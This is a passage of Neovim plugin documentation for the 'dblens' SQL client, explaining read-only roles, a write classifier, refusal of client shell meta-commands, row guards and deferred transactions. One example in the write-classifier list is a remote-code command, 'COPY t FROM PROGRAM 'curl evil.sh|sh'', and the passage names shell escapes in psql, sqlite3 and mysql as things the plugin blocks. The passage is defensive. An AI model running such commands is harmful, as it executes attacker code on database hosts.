it at, so this is a change to your database, not to your config: create a
read-only role and put it in the connection's `user`. >
    -- PostgreSQL
    CREATE ROLE dblens_ro LOGIN PASSWORD '...'
      NOSUPERUSER NOCREATEDB NOCREATEROLE;
    GRANT CONNECT ON DATABASE app TO dblens_ro;
    GRANT USAGE ON SCHEMA public TO dblens_ro;
    GRANT SELECT ON ALL TABLES IN SCHEMA public TO dblens_ro;
    ALTER DEFAULT PRIVILEGES IN SCHEMA public
      GRANT SELECT ON TABLES TO dblens_ro;

    -- MySQL / MariaDB. No FILE privilege, so LOAD_FILE and INTO OUTFILE
    -- fail; no CREATE ROUTINE, so a shell UDF cannot be installed.
    CREATE USER 'dblens_ro'@'%' IDENTIFIED BY '...';
    GRANT SELECT, SHOW VIEW ON app.* TO 'dblens_ro'@'%';

    -- SQL Server. This one is NOT optional: it is the ONLY hard boundary
    -- there, because the engine has no read-only connection mode at all.
    CREATE LOGIN dblens_ro WITH PASSWORD = '...';
    CREATE USER dblens_ro FOR LOGIN dblens_ro;
    ALTER ROLE db_datareader ADD MEMBER dblens_ro;
    DENY EXECUTE TO dblens_ro;
<
SQLite and DuckDB have no roles: `-readonly` is already the open mode, `-safe`
closes the filesystem, and the file's own permissions (`chmod a-w app.db`) are
the layer under both.

Verified live on PostgreSQL 16, as that role: a plain INSERT is "permission
denied for table"; `lo_export` and `pg_read_file` are "permission denied for
function"; and a direct `dblink_exec` over the server's own socket is refused
with "Non-superusers must provide a password in the connection string" - the
peer-auth escape closes with the superuser bit.

ONE THING A READ-ONLY ROLE STILL DOES NOT COVER. A SECURITY DEFINER function
runs with its OWNER's privileges - that is what it is for. The same
`refresh_cache()` wrapper wrote its row as `dblens_ro` too, because a
superuser owns it and PostgreSQL grants EXECUTE to PUBLIC by default. That is
a privilege escalation the database already contains, reachable by every role
and by every client. If it matters to you, take the grant back: >
    REVOKE EXECUTE ON FUNCTION refresh_cache(text) FROM PUBLIC;
<
Verified: after that the same call is "permission denied for function", and
no row lands.

WHAT THE CLASSIFIER IS FOR                                *dblens-safety-read*

dblens still reads each statement to decide whether it is a write and whether
it is destructive. That drives the confirmation prompt, and the early
"connection X is read-only" message. It is BEST-EFFORT and it is UX: a miss
costs a prompt on a writable connection, not a table. What a locked connection
is allowed to send is decided by the rule above, which consults no lexer.

It is still biased closed. A statement counts as a read only when it is a
single statement led by SELECT, WITH, VALUES, TABLE, SHOW, DESCRIBE, a
reporting PRAGMA, or an EXPLAIN that does not ANALYZE; with no INTO/OUTFILE
redirect, no stacked second statement, and no punctuation outside the set that
appears in real SQL operators. Each of these is a write, and prompts: >
    WITH d AS (DELETE FROM t RETURNING *) SELECT count(*) FROM d
    COPY t FROM PROGRAM 'curl evil.sh|sh'
    DO $$ BEGIN DELETE FROM t; END $$
    CALL wipe()
    SELECT * INTO copy_of_users FROM users
    PRAGMA user_version = 42
    SELECT 1; DROP TABLE t
<
Where a write verb is a NAME it is left alone. These are ordinary reads: >
    SELECT REPLACE(name, 'a', 'b') FROM t
    SELECT TRUNCATE(x, 2) FROM t
    SELECT id, comment FROM posts WHERE comment IS NOT NULL
    SELECT größe FROM messwerte
    SELECT * FROM t FOR UPDATE
<
A write verb only counts when it sits where a nested statement could begin.

EXPLAIN ANALYZE is classified by the statement INSIDE it, because on
PostgreSQL and MySQL it runs that statement - as are DESCRIBE ANALYZE and DESC
ANALYZE, which are MySQL synonyms for it. `EXPLAIN ANALYZE DELETE ...` is
therefore a destructive write, with the float saying plainly that it will run.
Plain EXPLAIN only plans, and stays a read.

CLIENT META-COMMANDS                                      *dblens-safety-meta*

psql runs `\!` as a shell command in the middle of a statement, `sqlite3
-batch` honours `.shell`, and the mysql client honours a bare `system` or
`source` at the head of a line even in batch mode - `system` shells out and
`source` reads and executes a file on YOUR machine. None of these is SQL, so a
read-only connection does not touch them, and no client flag turns them off:
`--skip-named-commands` still honours them at the head of a line.

dblens refuses them itself, on every connection: a statement starting with
`.`, one containing an unquoted backslash, or a line beginning `system`,
`source`, `tee`, `pager`, `edit`, `connect` or `delimiter`. A column with one
of those names can still be used by quoting it. sqlite3 is additionally run
with `-safe`, which refuses `.shell`, `.load`, `.import` and ATTACH at the
client (sqlite3 3.34 or newer); MySQL with `--local-infile=0`.

CONNECTION PATHS                                          *dblens-safety-path*

A sqlite `path` is expanded with `~` and `$VAR` substitution only - never
through |expand()|, whose wildcard expansion RUNS backticks through the shell.
A backtick, a wildcard, `$(`, a `~user` form dblens cannot expand correctly,
or a leading `-` is rejected when the connection is validated, always as a
reported error rather than a raise, so a bad connections file names its
problem instead of taking |:DbLens| down with a traceback. Export paths are
expanded the same way.

`password_cmd` is the one field of a connection that is a command by
declaration. It is argv, run with no shell, and it is checked only for being a
runnable argv.

THE CONFIRM GATE                                       *dblens-safety-confirm*

UPDATE, DELETE, REPLACE, MERGE, DROP, TRUNCATE, ALTER, RENAME, GRANT and
REVOKE are destructive; other writes are not.

With `safety.confirm_destructive` (the default) a destructive statement is
shown in a preview float first: the exact SQL, the verb and target of each
destructive statement, and a flag when it affects a whole object with no
WHERE. It runs only when you confirm. `safety.confirm_write` extends the same
gate to non-destructive writes. The two are evaluated per class, so a script
holding both an INSERT and a DROP is gated by both settings. An unconfirmed
write is refused by the session, not merely left undrawn.

Before a single destructive ad-hoc statement, an adapter that can estimate
without executing shows the planner's row estimate: PostgreSQL through
EXPLAIN (FORMAT JSON), MySQL through EXPLAIN. SQLite cannot, and says so.

THE EXACTLY-ONE-ROW GUARD                                *dblens-safety-guard*

A cell edit or a row delete builds its WHERE from the table's primary key or,
when the table has none, from every column of the displayed row. Either way
the change carries a guard: >
    SELECT count(*) FROM <table> WHERE <the same predicate>
<
The session runs the guard first and refuses the change unless it returns
exactly 1, reporting how many rows the predicate actually matched. That is
what makes editing a table without a primary key safe: an ambiguous predicate
is refused rather than applied to several rows. The preview says which of the
two identifications is in use. An INSERT targets no existing row and carries
no guard.

In transaction mode the guard is emitted INTO the committed batch, immediately
before the change it guards, so it is re-checked against the database as the
transaction sees it rather than as it was at queue time. A guard that no
longer matches exactly one row aborts the whole batch.

Outside a transaction the guard and the write are two separate client
invocations, so a concurrent writer between them is not excluded. The guard
bounds mistakes, not races.

FILTERS                                                 *dblens-safety-filter*

A WHERE typed into the results filter is checked by an allow-list before it is
spliced into a statement. Rejected: a comment (which would comment out the
LIMIT/OFFSET appended after it), an unclosed quote, any punctuation outside
the SQL operator set - which drops `;` and a bare `\` together, so psql's `\!`
never reaches the client - and a write verb where a nested statement could
begin. A backslash INSIDE a literal is rejected only on MySQL and MariaDB,
where `NO_BACKSLASH_ESCAPES` decides what it means; the other engines accept
it, so a Windows path or a regex filters normally there.

What makes that safe is that no dialect is left guessing about its own server.
A PostgreSQL/DuckDB literal is written `E'...'`, which means the same thing
whatever `standard_conforming_strings` is set to, and dblens also pins
`standard_conforming_strings=on` and clears `NO_BACKSLASH_ESCAPES` on the
connections it opens.

`REPLACE(...)`, a column called `comment` and non-ASCII identifiers are
accepted; a column named after a SQL verb can also be quoted.

The filter bar is still raw SQL. The check stops a fragment escaping the
statement; it does not stop an expensive or volatile function call.

10. Transactions                                         *dblens-transactions*

CLI clients are one-shot processes, so a transaction cannot be held open
across calls the way a socket session could. dblens therefore defers.

While transaction mode is on (`<leader>dB`), every change you make is queued,
not sent. A queued change is NOT visible to the server, to other clients, or
to a re-run of the same query. The grid marks it as pending rather than
pretending it landed, and the winbar and |dblens.statusline()| show
"TXN n pending". `<leader>dP` lists the queue.

`<leader>dC` commits. The whole queue is replayed, in order, inside one client
invocation wrapped in `BEGIN; ...; COMMIT;`, with each change's row guard
emitted immediately before it. Atomicity comes from the client's own flags -
`sqlite3 -bail`, `psql -v ON_ERROR_STOP=1`, and the mysql client's default
abort - because without them sqlite3 prints the error, SKIPS the failing
statement and still runs the trailing COMMIT.

If a statement fails, nothing landed, the report names which change failed
(and says so plainly when the failure was a guard that no longer matches one
row), and the queue is kept so you can fix it and retry.

If the commit is instead INTERRUPTED - a timeout, `<C-c>`, or the output cap -
the outcome is not known, so the queue is discarded rather than kept:
replaying it could apply a committed INSERT twice, or re-run a DELETE whose
guard has already been spent. dblens says so and tells you to check the table.

`<leader>dR` rolls back, which is free because nothing was ever sent. It
discards the queue and leaves transaction mode.

Consequences worth knowing:

- A queued UPDATE does not affect a later queued statement's view of the data;
  the server sees them all for the first time at commit.
- Committing runs the queue against the database as it is at commit time, not
  as it was when you queued the changes.
- Beginning a transaction while one is already open is refused, so a stray
  keypress cannot discard a queue by restarting it.
- A read-only connection refuses to begin or commit.

11. Completion                                             *dblens-completion*

Schema-aware SQL completion in the scratch buffer, on by default. It offers
keywords, tables and views, and columns. A qualifier - `users.` or an alias
declared in a FROM or JOIN clause - narrows the list to that table's columns,
shown with their type, PK, NOT NULL and foreign-key target. A dot inside a
string literal or a comment is part of that token and can never be read as a
qualifier.

`completion.keyword_case` controls how keywords are offered: 'upper', 'lower',
or 'keep', which follows the case you are typing. `completion.min_chars` gates
only the general list; a qualified `t.` or a FROM clause is answered with no
prefix at all.

The same engine is wired up three ways:

- 'omnifunc' is always set on the scratch buffer, so |i_CTRL-X_CTRL-O| works
  with nothing else installed.
- nvim-cmp: a `dblens` source is registered and added to the buffer.
- blink.cmp: a `dblens` source provider is registered and added for the
  buffer's filetype.

Both plugins are optional and a missing one is not an error.

12. Health                                                     *dblens-health*

`:checkhealth dblens` reports:

- the Neovim version, against the 0.10 minimum;
- the dblens version, whether the configuration loaded or was REFUSED, where
  the connections, history and session files live, and the resolved limits;
- each database client, whether it is executable, and its version;
- what LOCKED means per engine, as a warning wherever it is best-effort rather
  than enforced by the server (see |dblens-safety-mssql|);
- every connection with its kind, its access, and whether it has a password
  reference - never which variable, never its value;
- any global `<leader>d*` map dblens took over from another plugin;
- which SQL formatter `:DbLensFormat` would use, or what to install;
- which optional integrations (nvim-web-devicons, nvim-cmp, blink.cmp,
  which-key.nvim) are installed.

A missing client is a warning rather than an error: most users only ever use
one of the six.

15. Limitations                                           *dblens-limitations*

The read-only behaviour is verified live on all six engines - SQLite 3.53,
DuckDB 1.5.5, PostgreSQL 18.4, MySQL 8.4, MariaDB 11.8 and SQL Server 2022 -
by the cases in `tests/spec/readonly_spec.lua` and `tests/spec/engines_spec.lua`,
which need a server (or the client binary) and skip with a note when there is
none. CI supplies `sqlite3` and `duckdb` only, so the four server engines are
verified where a maintainer runs them, not on every push. The rest of each surface - catalog queries, DDL reconstruction, error
reporting - has much thinner live coverage, so expect rough edges there. The
newest three (mariadb, duckdb, mssql) are the thinnest.

Other limits:

- SQL SERVER'S LOCKED MODE IS BEST-EFFORT (BETA), enforced by dblens rather
  than the engine: a verb blocklist that cannot be proven complete against
  every administrative statement, so connect as a read-only SQL login for a
  hard boundary. Its NULL decoding is ambiguous too. Read
  |dblens-safety-mssql| before pointing a locked `mssql` connection at
  anything you care about.
- DuckDB reports no affected-row count: it has no `changes()` and prints
  nothing at all for a DML statement, so dblens reports none rather than a
  fabricated zero. It has no row estimate either, so a destructive statement
  gets no blast-radius preview.
- SQL Server has no EXPLAIN dblens can run: a plan needs SET SHOWPLAN_ALL ON
  as its own batch, and dblens sends one statement per client invocation.

- A result is capped at `max_rows` rows for rendering. The SQL is never
  rewritten, so the client still does the full work; client output is capped
  separately at `max_bytes`.
- Sorting and filtering apply to a browsed table only. For a query result, put
  ORDER BY or WHERE in the query.
- Foreign-key navigation, forward (`gf`) and reverse (`gF`), follows ONE column
  of a composite key and says so, so the view may hold more rows than the
  single row referenced. Reverse navigation searches the LOADED schema: it
  reads the columns of tables the tree never expanded, but a schema that has
  not been listed at all is not searched.
- The `?` overlay no longer fits an 80x24 screen in ANY pane - the grid lists
  46 bindings, and even the sidebar's list is taller than the 18 rows that
  size leaves. It scrolls there (`j`/`k`) and the footer says so; nothing is
  dropped or cut off the right edge. It fits from about 100x33.
- A `.sql` export replays TEXT faithfully. A binary/BLOB column does not
  survive it: the value reaches dblens through the client's text output, where
  a NUL byte truncates it, so the INSERT carries what the grid shows rather
  than the bytes in the table. Use the engine's own dump tool for those.
- A `.sql` export for MySQL/MariaDB escapes backslashes for the default SQL
  mode, which is the wrong escaping under NO_BACKSLASH_ESCAPES. The file names
  the mode it was written for in a comment at the top.
- A `.sql` export for PostgreSQL/DuckDB writes `E'...'` literals, so the file
  replays the same whatever standard_conforming_strings is set to. That syntax
  is not portable to the other engines.
- SQLite exposes no schema level (attached databases are out of scope) and has
  neither EXPLAIN ANALYZE nor a row estimate.
- PostgreSQL and SQL Server have no native DDL statement, so the DDL view is
  reconstructed from the catalog. It is meant to be read, not replayed.
- Affected-row counts must ride along in the same client invocation, so an
  adapter with no affected-rows query (PostgreSQL, DuckDB) reports none.
- A LOCKED connection is not a sandbox around a user who already holds write
  credentials. The side-channel refusal matches names and a SECURITY DEFINER
  wrapper defeats it; a database read-only role is the hard boundary. What
  each does and does not cover: |dblens-safety-guarantee|.
